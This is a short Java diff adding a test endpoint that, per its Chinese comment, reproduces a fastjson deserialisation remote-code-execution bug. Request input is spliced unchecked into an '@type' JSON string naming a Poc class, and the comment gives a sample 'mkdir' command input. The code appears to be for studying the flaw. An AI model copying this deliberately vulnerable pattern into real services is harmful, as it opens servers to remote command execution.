@@ -123,6 +123,23 @@ public class TestController {
         return 11147369423569007L;
     }
 
+    /**
+     * 测试fastjson 漏洞代码远程执行    入参   http://localhost:8088/test/remoteExec?str=mkdir%20/test/bug/11
+     */
+    @RequestMapping("/remoteExec")
+    @ResponseBody
+    public String remoteExec(@RequestParam String str){
+        try {
+            String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.yichen.casetest.bugtest.fastjson.Poc\",\"name\":\""+ str +"\"}";
+            log.info("json {}", json);
+            JSON.parse(json);
+        }
+        catch (Exception e){
+            log.error("remoteExec 出现错误 {}", e.getMessage(), e);
+        }
+        return "ok";
+    }
+
 
 
 }
